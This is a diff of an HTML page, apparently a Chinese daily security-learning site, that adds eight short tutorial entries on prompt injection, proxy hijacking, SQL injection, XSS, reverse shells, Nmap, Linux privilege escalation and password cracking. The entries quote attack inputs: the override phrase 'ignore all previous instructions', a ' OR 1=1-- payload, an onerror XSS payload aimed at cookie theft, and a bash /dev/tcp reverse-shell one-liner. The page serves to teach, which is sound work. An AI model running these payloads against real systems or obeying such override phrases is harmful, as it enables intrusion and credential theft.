@@ -49,12 +49,98 @@ footer a{color:#98c379}
 </div>
 
 <div class="stats">
-<div class="stat-card"><div class="stat-val" id="totalDays">3</div><div class="stat-label">已发布天数</div></div>
-<div class="stat-card"><div class="stat-val" id="totalEntries">26</div><div class="stat-label">知识条目</div></div>
-<div class="stat-card"><div class="stat-val" id="lastUpdate">2026-06-07</div><div class="stat-label">最新更新</div></div>
+<div class="stat-card"><div class="stat-val" id="totalDays">4</div><div class="stat-label">已发布天数</div></div>
+<div class="stat-card"><div class="stat-val" id="totalEntries">34</div><div class="stat-label">知识条目</div></div>
+<div class="stat-card"><div class="stat-val" id="lastUpdate">2026-06-08</div><div class="stat-label">最新更新</div></div>
 </div>
 
 <div id="entries">
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-date">📅 2026年6月8日 周一</div>
+      <div class="day-count">🛡 今天 8 条</div>
+    </div>
+    <div class="entry">
+      <div class="entry-title">提示注入攻击 (Prompt Injection)：用文字骗过 AI <span style="font-size:0.75em">⭐⭐ 基础</span></div>
+      <div class="entry-meta">
+        <span class="tag medium">MEDIUM</span>
+        <span class="tag">AI安全</span>
+        <span class="tag">提示注入</span>
+        <span class="tag">LLM</span>
+      </div>
+      <div class="entry-desc">用精心构造的文字欺骗 AI 执行非预期指令。在对话中塞入“忽略之前所有指令”测试 AI 是否上当，或将恶意指令藏在网页/文档中等 AI 读取时自动触发。<b>攻击者视角：</b>越狱 (Jailbreak) 绕过 AI 安全限制，系统提示词泄露可暴露后端逻辑。</div>
+    </div>
+    <div class="entry">
+      <div class="entry-title">住宅代理网络劫持：免费 App 偷偷把设备变成跳板 <span style="font-size:0.75em">⭐⭐ 基础</span></div>
+      <div class="entry-meta">
+        <span class="tag high">HIGH</span>
+        <span class="tag">网络安全</span>
+        <span class="tag">代理劫持</span>
+        <span class="tag">IoT</span>
+      </div>
+      <div class="entry-desc">免费 App 内嵌代理 SDK，用模糊隐私条款获取同意后，将智能电视等设备变成住宅代理出口节点。你的家庭 IP 被别人用来绕过网站封锁。<b>攻击者视角：</b>住宅代理比机房 IP 更难被识别，真实用户设备是最佳“隐身衣”。</div>
+    </div>
+    <div class="entry">
+      <div class="entry-title">SQL 注入：从登录框到整个数据库 <span style="font-size:0.75em">⭐⭐ 基础</span></div>
+      <div class="entry-meta">
+        <span class="tag high">HIGH</span>
+        <span class="tag">SQL注入</span>
+        <span class="tag">Web安全</span>
+        <span class="tag">OWASP</span>
+      </div>
+      <div class="entry-desc">在登录框输入 &lt;code&gt;' OR 1=1--&lt;/code&gt; 测试漏洞，用 UNION SELECT 把其他表数据混在正常结果里拿出来。<b>攻击者视角：</b>登录框打个单引号报错就说明有戏，盲注可逐字符猜出整个数据库。练习：PortSwigger SQL Injection Labs（免费）。</div>
+    </div>
+    <div class="entry">
+      <div class="entry-title">跨站脚本攻击 (XSS)：注入 JavaScript 劫持会话 <span style="font-size:0.75em">⭐⭐ 基础</span></div>
+      <div class="entry-meta">
+        <span class="tag high">HIGH</span>
+        <span class="tag">XSS</span>
+        <span class="tag">Web安全</span>
+        <span class="tag">前端攻击</span>
+      </div>
+      <div class="entry-desc">反射型通过 URL 参数触发，存储型存入数据库所有访问者中招，DOM 型修改页面结构不经过服务器。用 &lt;code&gt;&amp;lt;img onerror=alert(1) src=x&amp;gt;&lt;/code&gt; 绕过过滤器。<b>攻击者视角：document.cookie 偷走登录凭证，显示假登录框骗取密码。</div>
+    </div>
+    <div class="entry">
+      <div class="entry-title">反弹 Shell (Reverse Shell)：让目标主动“回拨”控制 <span style="font-size:0.75em">⭐⭐⭐ 进阶</span></div>
+      <div class="entry-meta">
+        <span class="tag high">HIGH</span>
+        <span class="tag">渗透测试</span>
+        <span class="tag">反弹Shell</span>
+        <span class="tag">红队</span>
+      </div>
+      <div class="entry-desc">在自己电脑开监听 &lt;code&gt;nc -lvnp 4444&lt;/code&gt;，在目标执行 &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/IP/4444 0&amp;gt;&amp;amp;1&lt;/code&gt;，目标主动连过来。<b>攻击者视角：</b>防火墙只挡“进来”不挡“出去”，反弹 Shell 绕过入站过滤。PentestMonkey 速查表是必备收藏。</div>
+    </div>
+    <div class="entry">
+      <div class="entry-title">Nmap 网络侦察：攻击前的“侦察兵” <span style="font-size:0.75em">⭐ 入门</span></div>
+      <div class="entry-meta">
+        <span class="tag low">LOW</span>
+        <span class="tag">信息收集</span>
+        <span class="tag">Nmap</span>
+        <span class="tag">侦察</span>
+      </div>
+      <div class="entry-desc">先扫网段找活人 &lt;code&gt;nmap -sn 192.168.1.0/24&lt;/code&gt;，再扫端口找入口 &lt;code&gt;nmap -sS -p- 目标IP&lt;/code&gt;，最后 &lt;code&gt;--script vuln&lt;/code&gt; 自动检测漏洞。<b>攻击者视角：</b>SYN 半开扫描速度快不易被发现，NSE 脚本引擎自动化漏洞检测。练习：TryHackMe Nmap 房间。</div>
+    </div>
+    <div class="entry">
+      <div class="entry-title">Linux 提权：从普通用户到 root <span style="font-size:0.75em">⭐⭐⭐ 进阶</span></div>
+      <div class="entry-meta">
+        <span class="tag high">HIGH</span>
+        <span class="tag">提权</span>
+        <span class="tag">Linux</span>
+        <span class="tag">SUID</span>
+      </div>
+      <div class="entry-desc">找 SUID 文件 &lt;code&gt;find / -perm -4000&lt;/code&gt;，查 sudo 权限 &lt;code&gt;sudo -l&lt;/code&gt;，搜索内核漏洞（DirtyPipe/DirtyCow），劫持可写的 cron 定时任务。<b>攻击者视角：</b>GTFOBins 是提权时的“字典”，列出所有能被滥用来提权的合法程序。</div>
+    </div>
+    <div class="entry">
+      <div class="entry-title">密码破解与哈希攻击：字典+规则是核心武器 <span style="font-size:0.75em">⭐⭐ 基础</span></div>
+      <div class="entry-meta">
+        <span class="tag medium">MEDIUM</span>
+        <span class="tag">密码破解</span>
+        <span class="tag">Hashcat</span>
+        <span class="tag">认证攻击</span>
+      </div>
+      <div class="entry-desc">拿到密码哈希后用 hashid 识别类型，Hashcat + rockyou.txt 字典先跑弱密码，再加规则变换（大小写、加数字、替换字母）。<b>攻击者视角：</b>加了 Salt 的哈希无法用彩虹表，只能逐个计算。练习：TryHackMe John the Ripper 房间。</div>
+    </div>
+  </div>
   <div class="day-card">
     <div class="day-header">
       <div class="day-date">📅 2026年6月7日 周日</div>
@@ -341,9 +427,9 @@ footer a{color:#98c379}
 
 <script>
 // Stats will be updated by the cron job
-document.getElementById('totalDays').textContent = '3';
-document.getElementById('totalEntries').textContent = '26';
-document.getElementById('lastUpdate').textContent = '2026-06-07';
+document.getElementById('totalDays').textContent = '4';
+document.getElementById('totalEntries').textContent = '34';
+document.getElementById('lastUpdate').textContent = '2026-06-08';
 </script>
 </body>
 </html>
